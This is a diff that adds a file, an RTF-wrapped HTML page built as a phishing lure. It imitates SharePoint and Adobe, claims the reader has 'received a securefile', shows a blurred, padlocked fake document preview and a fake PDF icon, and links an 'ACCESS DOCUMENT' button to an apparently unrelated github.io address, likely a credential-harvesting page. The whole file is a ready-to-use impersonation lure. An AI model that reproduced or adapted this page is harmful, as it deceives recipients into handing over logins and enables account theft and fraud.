@@ -1,0 +1,105 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2822
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 <!DOCTYPE html>\
+<html lang="en">\
+<head>\
+  <meta charset="UTF-8"/>\
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>\
+  <title>Secure File via Adobe</title>\
+  <style>\
+    *\{margin:0;padding:0;box-sizing:border-box;\}\
+    body\{background:#fff;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:40px 24px;\}\
+    .container\{max-width:560px;width:100%;text-align:center;\}\
+    .title\{font-size:28px;font-weight:900;color:#111;line-height:1.3;margin-bottom:28px;\}\
+\
+    /* Blurred doc preview */\
+    .doc-preview\{position:relative;width:100%;max-width:420px;margin:0 auto 28px;aspect-ratio:3/4;border:1px solid #ddd;background:#fff;box-shadow:0 2px 8px rgba(0,0,0,.08);overflow:hidden;\}\
+    .doc-inner\{position:absolute;inset:0;padding:16px;filter:blur(3px);pointer-events:none;user-select:none;\}\
+    .line\{height:6px;background:#d0d0d0;border-radius:3px;margin-bottom:6px;\}\
+    .line.dark\{background:#b0b0b0;\}\
+    .line.short\{width:40%;\}\
+    .line.med\{width:60%;\}\
+    .line.long\{width:80%;\}\
+    .line.full\{width:100%;\}\
+    .header-row\{display:flex;justify-content:space-between;margin-bottom:14px;\}\
+    .col\{display:flex;flex-direction:column;gap:5px;\}\
+    .col.right\{align-items:flex-end;\}\
+    .table-header\{display:flex;gap:8px;border-bottom:1px solid #ccc;padding-bottom:6px;margin-bottom:8px;\}\
+    .table-header div,.table-row div\{flex:1;height:6px;background:#b0b0b0;border-radius:3px;\}\
+    .table-row\{display:flex;gap:8px;margin-bottom:5px;\}\
+    .table-row div\{background:#d8d8d8;height:5px;\}\
+    .doc-footer\{position:absolute;bottom:12px;left:16px;right:16px;border-top:1px solid #ccc;padding-top:8px;display:flex;gap:10px;\}\
+    .doc-footer div\{flex:1;\}\
+    .doc-footer .fl\{height:5px;background:#ccc;border-radius:3px;margin-bottom:4px;\}\
+    .doc-footer .fd\{height:5px;background:#aaa;border-radius:3px;\}\
+\
+    /* Padlock overlay */\
+    .lock-overlay\{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;\}\
+\
+    /* File row */\
+    .file-row\{display:flex;align-items:center;justify-content:center;gap:16px;margin-bottom:24px;\}\
+    .file-size\{font-size:38px;font-weight:300;color:#222;letter-spacing:-1px;\}\
+\
+    .instruction\{font-size:17px;font-weight:700;color:#111;line-height:1.6;margin-bottom:28px;\}\
+\
+    .btn-row\{display:flex;align-items:center;justify-content:center;gap:10px;\}\
+    .btn\{display:inline-block;background:#0000ff;color:#fff;font-family:'Arial Black',Arial,sans-serif;font-size:24px;font-weight:900;text-decoration:underline;padding:6px 18px;cursor:pointer;\}\
+    .btn:hover\{background:#0000cc;\}\
+  </style>\
+</head>\
+<body>\
+<div class="container">\
+\
+  <!-- SharePoint logo -->\
+  <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:20px;">\
+    <div style="position:relative;width:40px;height:40px;background:#0078d4;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">\
+      <span style="color:white;font-family:'Segoe UI',Arial,sans-serif;font-weight:900;font-size:22px;line-height:1;">S</span>\
+      <div style="position:absolute;bottom:-4px;right:-8px;width:16px;height:16px;background:#036ac4;border-radius:2px;display:flex;align-items:center;justify-content:center;">\
+        <span style="color:white;font-weight:900;font-size:10px;line-height:1;">\'9b</span>\
+      </div>\
+    </div>\
+    <span style="color:#0078d4;font-family:'Segoe UI',Arial,sans-serif;font-weight:600;font-size:30px;letter-spacing:-0.5px;margin-left:10px;">SharePoint</span>\
+  </div>\
+\
+  <p class="title">You've received a securefile Via Adobe.</p>\
+\
+  <!-- PDF icon + size -->\
+  <div class="file-row">\
+    <svg width="52" height="64" viewBox="0 0 52 64" fill="none" xmlns="http://www.w3.org/2000/svg">\
+      <rect x="1" y="1" width="42" height="54" rx="2" fill="#f5f0eb" stroke="#c8b8a0" stroke-width="1.5"/>\
+      <path d="M33 1 L43 11 L33 11 Z" fill="#e0d4c0"/>\
+      <rect x="0" y="36" width="44" height="16" rx="1" fill="#9b3a1a"/>\
+      <text x="22" y="48" text-anchor="middle" fill="white" font-size="9" font-family="Arial,sans-serif" font-weight="bold">pdf</text>\
+      <line x1="8" y1="18" x2="34" y2="18" stroke="#c8b8a0" stroke-width="1.2"/>\
+      <line x1="8" y1="24" x2="34" y2="24" stroke="#c8b8a0" stroke-width="1.2"/>\
+      <line x1="8" y1="30" x2="26" y2="30" stroke="#c8b8a0" stroke-width="1.2"/>\
+    </svg>\
+    <span class="file-size">56.1KB</span>\
+  </div>\
+\
+  <p class="instruction">\
+    To receive and download this PDF file,<br>\
+    Click the access document below.\
+  </p>\
+\
+  <div class="btn-row">\
+    <a class="btn"\
+       href="https://jab9383.github.io/MPD4995729-231832/"\
+       target="_blank" rel="noopener noreferrer">\
+      ACCESS DOCUMENT\
+    </a>\
+    <svg width="26" height="26" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">\
+      <rect x="1" y="1" width="20" height="20" rx="3" fill="#D83B01"/>\
+      <text x="11" y="16" text-anchor="middle" fill="white" font-size="13" font-family="Arial,sans-serif" font-weight="bold">O</text>\
+    </svg>\
+  </div>\
+\
+</div>\
+</body>\
+</html>\
+}
